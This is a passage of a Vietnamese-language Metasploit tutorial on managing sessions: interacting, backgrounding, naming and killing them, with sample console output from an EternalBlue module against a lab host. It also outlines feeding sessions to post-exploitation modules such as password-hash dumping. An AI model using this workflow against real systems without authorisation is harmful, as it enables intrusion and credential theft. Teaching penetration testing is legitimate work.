`Id` là số dùng để tương tác, kết thúc, hay định tuyến traffic qua session đó. `Name` là nhãn tùy chọn, gán bằng `sessions -n <name> -i <id>`, hữu ích lúc có nhiều session cùng lúc dễ lẫn. `Type` cho biết loại session và kiến trúc. `Information` với session Meterpreter thì hiện luôn user và hostname — nhìn phát biết ngay đang có `NT AUTHORITY\SYSTEM` hay chỉ user thường (session shell thường để trống cột này). `Connection` là cặp IP:cổng cục bộ và từ xa.

Ví dụ trên, exploit chạy hai lần lên cùng một máy, mỗi lần kết nối ngược về một cổng khác (`4444`, `4445`) — đó là lý do nên đặt `LPORT` khác nhau mỗi lần đánh nếu chạy song song nhiều cuộc.

### sessions -i — tương tác lại

Quay lại một session cụ thể bằng `sessions -i` kèm ID:

```
msf6 > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

Giờ đang tương tác trực tiếp với session 1, lệnh gõ vào chạy trong ngữ cảnh session đó.

Muốn chuyển session khác thì đẩy session hiện tại vào nền trước (`background` hoặc `Ctrl+Z`), rồi tương tác với cái kia:

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 2
[*] Starting interaction with 2...
```

### sessions -k / -K — kết thúc

Kết thúc một session bằng `sessions -k` kèm ID:

```
msf6 > sessions -k 2
[*] Killing session 2
[*] 10.10.10.15 - Meterpreter session 2 closed. Reason: User exit
```

Kết thúc hết luôn một lượt (cẩn thận cái này):

```
msf6 > sessions -K
[*] Killing all sessions...
[*] 10.10.10.15 - Meterpreter session 1 closed. Reason: User exit
```

Chữ thường `-k <id>` chỉ giết một session, chữ hoa `-K` giết sạch. Mất hết session giữa chừng một buổi pentest thật là chuyện chẳng ai muốn, nên `-K` chỉ nên bấm khi thật sự có ý định dọn dẹp.

### Session là cầu nối tới module post-exploitation

Session không chỉ để mở terminal tương tác — nó còn là cầu nối cho các module `post/`. Nhiều module post cần tham số `SESSION` trỏ tới một session sẵn có, kiểu module dump password hash trên Windows cần một session Meterpreter đang mở đúng trên máy đó mới chạy được.

Quy trình chung: khai thác mục tiêu, mở session Meterpreter, đẩy session đó vào nền, nạp module post-exploitation bằng `use`, set `SESSION` bằng đúng ID, rồi chạy.

Phần post-exploitation đủ sâu để dành hẳn một bài riêng, để sau viết tiếp. Điều cần nhớ ở đây là session không chỉ để truy cập tương tác — nó là kết nối tái sử dụng được cho các module khác tận dụng.

---

## Tham khảo

- Metasploit Documentation: <https://docs.metasploit.com/>
- Rapid7 Metasploit: <https://www.rapid7.com/products/metasploit/>
